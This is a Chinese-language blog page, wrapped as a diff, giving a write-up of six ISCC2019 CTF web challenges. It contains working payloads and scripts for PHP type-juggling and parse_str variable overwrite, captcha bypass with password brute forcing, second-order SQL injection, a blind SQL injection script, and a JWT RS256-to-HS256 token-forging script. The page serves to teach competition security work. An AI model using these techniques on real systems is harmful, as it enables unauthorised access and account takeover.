@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>ISCC2019 Web Writeup | Cryscat&#39;s Blog | 一只安全狗</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#000000">
+    
+    
+    <meta name="keywords" content="ISCC,Writeup,CTF,Web">
+    <meta name="description" content="web1代码审计1234567891011121314151617&amp;lt;?phperror_reporting(0);require &apos;flag.php&apos;;$value = $_GET[&apos;value&apos;];$password = $_GET[&apos;password&apos;];$username = &apos;&apos;;for ($i = 0; $i &amp;lt; count($value); ++$i) &amp;#123;">
+<meta name="keywords" content="ISCC,Writeup,CTF,Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISCC2019 Web Writeup">
+<meta property="og:url" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/index.html">
+<meta property="og:site_name" content="Cryscat&#39;s Blog">
+<meta property="og:description" content="web1代码审计1234567891011121314151617&amp;lt;?phperror_reporting(0);require &apos;flag.php&apos;;$value = $_GET[&apos;value&apos;];$password = $_GET[&apos;password&apos;];$username = &apos;&apos;;for ($i = 0; $i &amp;lt; count($value); ++$i) &amp;#123;">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/1.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/2.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/3.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/4.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/5.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/6.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/7.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/8.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/9.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/10.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/11.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/12.jpg">
+<meta property="og:updated_time" content="2019-05-27T16:16:27.777Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ISCC2019 Web Writeup">
+<meta name="twitter:description" content="web1代码审计1234567891011121314151617&amp;lt;?phperror_reporting(0);require &apos;flag.php&apos;;$value = $_GET[&apos;value&apos;];$password = $_GET[&apos;password&apos;];$username = &apos;&apos;;for ($i = 0; $i &amp;lt; count($value); ++$i) &amp;#123;">
+<meta name="twitter:image" content="http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/1.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="Cryscat&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/bg.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Cryscat</h5>
+          <a href="mailto:cry3c4t@gmail.com" title="cry3c4t@gmail.com" class="mail">cry3c4t@gmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/">
+                <i class="icon icon-lg icon-home"></i>
+                Home
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives">
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags">
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Cryscat" target="_blank">
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.zhihu.com/people/kaka-64-40/activities" target="_blank">
+                <i class="icon icon-lg icon-book"></i>
+                Zhihu
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/kaka27258546" target="_blank">
+                <i class="icon icon-lg icon-twitter"></i>
+                Twitter
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/aboutme">
+                <i class="icon icon-lg icon-black-tie"></i>
+                About&amp;Friendlink
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">ISCC2019 Web Writeup</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">ISCC2019 Web Writeup</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-05-22T13:19:29.000Z" itemprop="datePublished" class="page-time">
+  2019-05-22
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#web1"><span class="post-toc-number">1.</span> <span class="post-toc-text">web1</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#web2"><span class="post-toc-number">2.</span> <span class="post-toc-text">web2</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#web3"><span class="post-toc-number">3.</span> <span class="post-toc-text">web3</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#web4"><span class="post-toc-number">4.</span> <span class="post-toc-text">web4</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#web5"><span class="post-toc-number">5.</span> <span class="post-toc-text">web5</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#web6"><span class="post-toc-number">6.</span> <span class="post-toc-text">web6</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-ISCC2019-Web-Writeup" class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">ISCC2019 Web Writeup</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-05-22 21:19:29" datetime="2019-05-22T13:19:29.000Z" itemprop="datePublished">2019-05-22</time>
+
+            
+
+
+            
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>代码审计<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$value = $_GET[<span class="string">'value'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$username = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">    <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'w3lc0me_To_ISCC2019'</span> &amp;&amp; intval($password) &lt; <span class="number">2333</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">2333</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p>
+<p>首先要求我们传入的数组value经过chr函数转为ascii拼接后构成<code>w3lc0me_To_ISCC2019</code>字符串，但<code>$value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127</code>部分代码限制了数组的键值的范围，这就与构成字符的要求矛盾。这时候可以利用chr()函数的自动取模功能进行绕过，当参数大于256时，chr函数会对输入的数字自动取模256，所以我们在原数组上每个键值增加256就行了。<br>最后一个if语句看似很矛盾<code>intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333)</code>。给intval()传入十六进制字符串或者科学计数法表示的字符串时，intval会出错为0。但+1后intval参数已经转换为十进制数字，可绕过if判断。</p>
+<blockquote>
+<p>payload:?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=0xbbb</p>
+</blockquote>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>打开链接是一个登录界面，要我们爆破admin的三位数密码。主要难点是绕过验证码，这道题的验证码生成是基于cookie的。将phpsessid清空就可绕过验证码直接进行密码爆破<br><img src="/2019/05/22/ISCC2019-Web-Writeup/1.jpg"><br><img src="/2019/05/22/ISCC2019-Web-Writeup/2.jpg"></p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>一道二次注入，注册<code>admin&#39;***#</code>形式的用户名，密码随意，然后登进去修改密码，此时修改的密码即为admin的密码，登录admin getflag。猜测修改密码部分后台代码<code>update users set password=&#39;?&#39; where username=&#39;?&#39;</code><br><img src="/2019/05/22/ISCC2019-Web-Writeup/3.jpg"><br><img src="/2019/05/22/ISCC2019-Web-Writeup/4.jpg"></p>
+<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>又一道代码审计<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>); </span><br><span class="line">$hashed_key = <span class="string">'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a'</span>; </span><br><span class="line">$parsed = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($parsed[<span class="string">"query"</span>]))&#123; </span><br><span class="line">    $query = $parsed[<span class="string">"query"</span>]; </span><br><span class="line">    $parsed_query = parse_str($query); </span><br><span class="line">    <span class="keyword">if</span>($parsed_query!=<span class="keyword">NULL</span>)&#123; </span><br><span class="line">        $action = $parsed_query[<span class="string">'action'</span>]; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($action===<span class="string">"auth"</span>)&#123; </span><br><span class="line">        $key = $_GET[<span class="string">"key"</span>]; </span><br><span class="line">        $hashed_input = hash(<span class="string">'sha256'</span>, $key); </span><br><span class="line">        <span class="keyword">if</span>($hashed_input!==$hashed_key)&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;img src='cxk.jpg'&gt;"</span>); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>看到<code>parse_str</code>函数，变量覆盖的老朋友了。。。随便给key赋个值，然后将key 啥256加密后的值覆盖变量hashed_key</p>
+<blockquote>
+<p>payload?/?action=auth&amp;key=1&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b</p>
+</blockquote>
+<img src="/2019/05/22/ISCC2019-Web-Writeup/5.jpg">
+<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>感觉有点脑洞啊……<br>主页说我不是Union.373的成员（虽然我确实不是）,很长一段时间没找到突破口。最后在User-Agent后加上Union.373就进去了。嗯？？？<br><img src="/2019/05/22/ISCC2019-Web-Writeup/6.jpg"><br>接着要我们输入用户名和密码，直接post<code>username=admin&amp;password=admin</code>得到提示：flag为成员的密码<br>通过payload<code>username=&#39;\*/\*&amp;password=*/&#39;</code>可以得到成员的用户名，然后进行注入<br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://39.100.83.188:8054/"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    str_16 = binascii.b2a_hex(payload.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    payload = <span class="string">"username=union_373_Tom' union all select 1,2,0x"</span> + str_16.decode() + <span class="string">" /*&amp;password=*/ order by 3,2,'1"</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'user-agent'</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36Union.373"</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=payload, headers=headers)</span><br><span class="line">    response.encoding = <span class="string">'utf-8'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'组织欢迎你，2!'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        temp_str=chr(i)</span><br><span class="line">        print(<span class="string">'\rflag--&gt;'</span>+flag+temp_str,end=<span class="string">''</span>,flush=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">if</span> http_get(flag + temp_str):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> temp_str==chr(<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(ord(temp_str) - <span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<img src="/2019/05/22/ISCC2019-Web-Writeup/7.jpg">
+<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>老规矩先注册，再登录。登上去发现header中多了这么个玩意儿<br><img src="/2019/05/22/ISCC2019-Web-Writeup/8.jpg"><br>iscc99后面是一段JWT，猜测本题是考JWT攻击。到<a href="https://jwt.io解一下" target="_blank" rel="noopener">https://jwt.io解一下</a><br><img src="/2019/05/22/ISCC2019-Web-Writeup/9.jpg"><br>发现网页中有这样一个接口<br><img src="/2019/05/22/ISCC2019-Web-Writeup/10.jpg"><br>末尾处是一段公钥加密代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getpubkey</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    get the pubkey for test</span></span><br><span class="line"><span class="comment">    /pubkey/&#123;md5(username+password)&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>依据此加密方式可知我的公钥地址：<code>/pubkey/a3cd2d4c60cad6118c24e081238c007e</code>（账号密码均为cryscat）<br>得到公钥：</p>
+<blockquote>
+<p>—–BEGIN PUBLIC KEY—–\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n—–END PUBLIC KEY—–</p>
+</blockquote>
+<p>RS256算法使用私钥对消息进行签名并使用公钥进行身份验证，而HS256算法使用密钥为所有消息进行签名和验证。如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。所以在这里我们考虑将RS256算法改为HS256（非对称密码算法=&gt;对称密码算法）来达到pubkey任意访问的目的。<br>将priv改为admin,加密脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">pubkey = <span class="string">'-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----'</span></span><br><span class="line">print(jwt.encode(&#123;<span class="string">"name"</span>: <span class="string">"cryscat"</span>,<span class="string">"priv"</span>: <span class="string">"admin"</span>&#125;, key=pubkey, algorithm=<span class="string">'HS256'</span>))</span><br></pre></td></tr></table></figure></p>
+<p>得到我们的可利用JWT<br><img src="/2019/05/22/ISCC2019-Web-Writeup/11.jpg"><br>换上这段JWT去访问list可以看到很多用户留下的链接，其中有一条是admin的，应该就是flag的所在之处了，访问getflag<br><img src="/2019/05/22/ISCC2019-Web-Writeup/12.jpg"></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.cryscat.com">
+            <img src="/img/avatar.jpg" alt="Cryscat">
+            Cryscat
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ISCC/">ISCC</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Writeup/">Writeup</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/&title=《ISCC2019 Web Writeup》 — Cryscat's Blog&pic=http://www.cryscat.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/&title=《ISCC2019 Web Writeup》 — Cryscat's Blog&source=在信安界苟延残喘" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ISCC2019 Web Writeup》 — Cryscat's Blog&url=http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/&via=http://www.cryscat.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/04/08/一次有趣的XSS弹弹乐/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">一次有趣的XSS弹弹乐</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="bottom">
+        <p><span>Cryscat &copy; 2018 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/&title=《ISCC2019 Web Writeup》 — Cryscat's Blog&pic=http://www.cryscat.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/&title=《ISCC2019 Web Writeup》 — Cryscat's Blog&source=在信安界苟延残喘" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ISCC2019 Web Writeup》 — Cryscat's Blog&url=http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/&via=http://www.cryscat.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.cryscat.com/2019/05/22/ISCC2019-Web-Writeup/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMklEQVR42u3aMW7DMAwF0Nz/0u6SoUAb+ZOyh9BPU9HYsp4GQiL5esXj+DXWz/x9fv1W9StbAwMD42sZx3Ksn1kvInnr0xbka8PAwHgOI586f2Yn7ObfxcDAwKgGwfVb+fwYGBgY+4ydK25ylMTAwMDoXWJ7C8qvvjvzYGBgzGbsXCzv/vuW+gYGBsZXMY7iWCfR8kvvVet5z4aBgTGakQe4KmZ9+cxnK7RlYGBgjGb0PpaXLXvFy/VyozkxMDAGMZKHrlpctRSavIuBgTGbkQTTXhtEr82i2WyBgYExmlFtceiVPC9LqK2vuxgYGKMZvbRa3irRuzBXQzAGBsZURuGmW0z674TaPNH28RKLgYExlJGn1fJkfZ6kywPuSboNAwNjHCOvbeZNEtUCZ7WcebJaDAyMcYyd42BemMyDZqEMsF4KBgbGIEavkaL3a3LczDfipL6BgYExiLFfT8hTZr0iQblnBAMDYyijF6eTq2wOyI+M/8yMgYExmrFfeqymyaqj8HUMDIzHMKqkQkCMw3SyueUDIgYGxiBGr9Ghd4jcT+Fd3K+BgYHxJYxeUizflPyZ/OCIgYExm3EUR3JAzI+P6wCdt2JgYGDMZlybrL+jPFk9YmJgYExl5EF2J7BW2zvKARcDA+MBjGrgyz9W3abC/RsDAwNj4/DXO4f2gjUGBgZGXsjMF9fboJOyBAYGxgMY1SatvIWiepVtFkExMDBGM3qHtgTfS/rv/AcDA2Mc4wdnd2qY/3uKAAAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
